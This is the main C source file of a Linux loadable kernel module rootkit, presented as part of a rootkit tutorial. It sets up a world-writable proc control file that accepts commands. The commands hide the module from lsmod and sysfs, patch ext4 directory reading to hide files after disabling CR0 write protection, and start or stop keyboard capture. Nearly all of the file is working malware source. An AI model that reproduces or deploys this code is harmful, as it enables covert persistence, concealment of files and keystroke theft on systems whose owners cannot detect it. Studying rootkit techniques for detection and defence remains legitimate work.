// Beneath C Level - Rootkit tutorial
//
// rootkit.c - The main file that loads and hides the rootkit
//
// Author: Nick Newson
// Website: http://beneathclevel.blogspot.co.uk/
//
// Tab size = 4

#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/sysfs.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/file.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <asm/uaccess.h>

#include "ext4_ops.h"
#include "hook.h"
#include "kb_ops.h"
#include "symbols.h"

MODULE_LICENSE( "GPL" );
MODULE_AUTHOR(  "nnewson@gmail.com" );
MODULE_VERSION( "0.1" );

// Type Declarations
typedef struct dentry				dentry;
typedef struct file					file;
typedef struct file_operations 		file_operations;
typedef struct inode				inode;
typedef struct kobject				kobject;
typedef struct list_head			list_head;
typedef struct mutex				mutex;
typedef struct path 				path;
typedef struct proc_dir_entry 		proc_dir_entry;
typedef struct sysfs_dirent			sysfs_dirent;

// Type Definitions
typedef void 						( *sysfs_unlink_sibling_func )(
										sysfs_dirent*			sd );

typedef int 						( *sysfs_link_sibling_func )(
										sysfs_dirent*			sd );

typedef void						( *km_command_func )(
										const char* const		data );

typedef struct
{
	const char* const				command_name;
	size_t							command_size;
	km_command_func					command;

	// Helper define to set name and size at same time ( including removing the null terminator )
	#define 						KM_COMMAND_NAME( name )		name, .command_size = sizeof( name ) - 1
} km_command;

typedef struct 
{
	unsigned						hidden;
} km_state;

// Constants
#define								c_buffer_size	256

// Function Declarations
static unsigned long				disable_wp(
										void );

static void							restore_wp(
										const unsigned long 	cr0 );

static int 							km_proc_read(
										char*					page,
										char**					start,
										off_t					off,
										int						count,
										int*					eof,
										void*					data );

static int 							km_proc_write(
										file*					file, 
										const char __user*		buffer,
										unsigned long 			count,
										void*					data );

static int		 					km_proc_init(
										void );

									// Commands
static void							km_hide_module(
										const char* const		data );
	
static void							km_show_module(
										const char* const		data );

static void							km_apply_ext4_mod(
										const char* const		data );

static void							km_remove_ext4_mod(
										const char* const		data );

static void							km_hide_file(
										const char* const		data );
	
static void							km_show_file(
										const char* const		data );

static void							km_capture_kb(
										const char* const		data );
	
static void							km_release_kb(
										const char* const		data );

// Globals
static km_command					g_commands[] = 
									{
										{
											.command_name = KM_COMMAND_NAME( "hide module" ),
											.command = km_hide_module,
										},
										{
											.command_name = KM_COMMAND_NAME( "show module" ),
											.command = km_show_module,
										},
										{
											.command_name = KM_COMMAND_NAME( "apply ext4" ),
											.command = km_apply_ext4_mod,
										},
										{
											.command_name = KM_COMMAND_NAME( "remove ext4" ),
											.command = km_remove_ext4_mod,
										},
										{
											.command_name = KM_COMMAND_NAME( "hide file " ),
											.command = km_hide_file,
										},
										{
											.command_name = KM_COMMAND_NAME( "show file " ),
											.command = km_show_file,
										},
										{
											.command_name = KM_COMMAND_NAME( "capture keyboard" ),
											.command = km_capture_kb,
										},
										{
											.command_name = KM_COMMAND_NAME( "release keyboard" ),
											.command = km_release_kb,
										},
									};

static km_state						g_state =	
									{
										.hidden = 0,
									};

static char							g_buffer[ c_buffer_size ];


static list_head*					g_modules = ( list_head* ) c_modules_symbol;
static mutex*						g_sysfs_mutex = ( mutex* ) c_sysfs_mutex_symbol;

static sysfs_unlink_sibling_func	sysfs_unlink_sibling = ( sysfs_unlink_sibling_func ) f_sysfs_unlink_sibling_symbol;
static sysfs_link_sibling_func		sysfs_link_sibling = ( sysfs_link_sibling_func ) f_sysfs_link_sibling_symbol;

// Function Definitions
static unsigned long 
disable_wp( 
	void 
)
{
	unsigned long			cr0;

	preempt_disable();
	cr0 = read_cr0();
	write_cr0( cr0 & ~X86_CR0_WP );

	return cr0;
}

static void
restore_wp(
	const unsigned long 	cr0
)
{
    write_cr0( cr0 );
    preempt_enable_no_resched();
}

static int
km_proc_read(
	char*					page,
	char**					start,
	off_t					off,
	int						count,
	int*					eof,
	void*					data
)
{
	int len = sprintf( page, "Hiding: %u\n", g_state.hidden );
	return len;
}

static int 						
km_proc_write(
	file*					file, 
	const char __user*		buffer,
	unsigned long 			count, 
	void*					data 
)
{
	if ( count > c_buffer_size )
	{
		count = c_buffer_size;
	}

	if( copy_from_user( g_buffer, buffer, count ) )
	{
		return -EFAULT;
	}
	else
	{
		size_t				i;
		size_t				num_commands = sizeof( g_commands ) / sizeof( g_commands[ 0 ] );

		// Replace any newlines with null-terminator
		char*				cursor = strchr( g_buffer, '\n' );
		if ( cursor )
		{
			*cursor = '\0';
		}

		for ( i = 0 ; i < num_commands ; i++ )
		{
			if ( strncmp( g_buffer, g_commands[ i ].command_name, g_commands[ i ].command_size ) == 0 )
			{
				( *g_commands[ i ].command )( g_buffer + g_commands[ i ].command_size );
				break;
			}
		}

		if ( i == num_commands )
		{
			printk( KERN_WARNING "km: Unknown command: '%s'\n", g_buffer );
		}
	}

	return count;
}

static int
km_proc_init(
	void
)
{	
	proc_dir_entry*			proc_file = create_proc_entry( "kmcc", S_IFREG | S_IRUGO | S_IWUGO, NULL );
	if ( proc_file )
	{
		proc_file->read_proc = km_proc_read;		
		proc_file->write_proc = km_proc_write;		
	}
	else
	{
		printk( KERN_WARNING "km: Unable to create proc kmcc\n" );
		return 1;
	}

	return 0;
}

static void
km_hide_module(
	const char* const        data
)
{	
	kobject*				kobj = &THIS_MODULE->mkobj.kobj;
	path					km_path;

	// Check to ensure we're hidden first...
	if ( g_state.hidden )
	{	
		return;
	}

	g_state.hidden = 1;

	// Remove from sysfs
	mutex_lock( g_sysfs_mutex );
	sysfs_unlink_sibling( kobj->sd );
	mutex_unlock( g_sysfs_mutex );

	kobj->state_in_sysfs = 0;

	spin_lock( &kobj->kset->list_lock );
	list_del_init( &kobj->entry );
	spin_unlock( &kobj->kset->list_lock );
	kset_put( kobj->kset );

	// Decrement parent ref count in sysfs
	kobject_put( kobj->parent );

	// Remove the km module from the dentry cache if it's present
	if ( kern_path( "/sys/module/km", LOOKUP_DIRECTORY, &km_path ) == 0 && km_path.dentry )
	{
		d_drop( km_path.dentry );	
	}

	// Remove from the module list - so lsmod can't see us
	mutex_lock( &module_mutex );
	list_del_rcu( &THIS_MODULE->list );
	mutex_unlock( &module_mutex );
}

static void
km_show_module(
	const char* const       data
)
{
	kobject*				kobj = &THIS_MODULE->mkobj.kobj;

	// Check to ensure we're hidden first...
	if ( !g_state.hidden )
	{	
		return;
	}

	g_state.hidden = 0;

	// Add to modules list
	mutex_lock( &module_mutex );
	list_add_rcu( &THIS_MODULE->list, g_modules);
	mutex_unlock( &module_mutex );

	// Increment parent ref count in sysfs
	kobject_get( kobj->parent );

	// Add to sysfs
    kset_get( kobj->kset );
    spin_lock( &kobj->kset->list_lock ); 
    list_add_tail( &kobj->entry, &kobj->kset->list );
    spin_unlock( &kobj->kset->list_lock );	

	kobj->state_in_sysfs = 1;

	mutex_lock( g_sysfs_mutex );
	sysfs_link_sibling( kobj->sd );
	mutex_unlock( g_sysfs_mutex );
}

static void
km_apply_ext4_mod(
	const char* const       data
)
{
	unsigned long			cr0 = disable_wp();	
	
	km_ext4_ops_apply_readdir();

	restore_wp( cr0 );
}

static void
km_remove_ext4_mod(
	const char* const       data
)
{
	unsigned long			cr0 = disable_wp();	

	km_ext4_ops_remove_readdir();

	restore_wp( cr0 );
}

static void
km_hide_file(
	const char* const        data
)
{
	km_ext4_ops_hide_file( data );
}

static void
km_show_file(
	const char* const        data
)
{
	km_ext4_ops_show_file( data );
}

static void
km_capture_kb(
	const char* const        data
)
{
	km_kb_capture();
}

static void
km_release_kb(
	const char* const        data
)
{
	km_kb_release();
}

// Module init function
static int __init
km_init(
	void
)
{
	if ( km_proc_init() )
		return 1;

	return 0;
}

// Module exit function
static void __exit
km_exit(
	void
)
{
	remove_proc_entry( "kmcc", NULL );
}

module_init( km_init );
module_exit( km_exit );
